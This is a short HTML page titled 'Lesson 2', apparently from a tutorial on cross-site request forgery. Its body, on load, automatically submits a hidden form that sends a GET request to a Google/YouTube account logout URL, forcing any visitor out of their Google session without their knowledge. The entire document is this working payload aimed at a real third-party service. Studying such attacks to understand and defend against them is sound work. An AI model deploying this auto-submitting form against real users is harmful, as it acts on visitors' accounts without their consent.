
<html>
<head>
	<title>Lesson 2</title>
</head>
<body onload="document.getElementById('f1').submit()">
	<form action="https://accounts.youtube.com/accounts/Logout2?hl=en&service=mail&ilo=1&ils=s.youtube,s.IN&ilc=0&continue=https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&hl=en&emr=1&zx=851789340" method="GET" id="f1">

<input type="submit">


	</form>

</body>
</html>

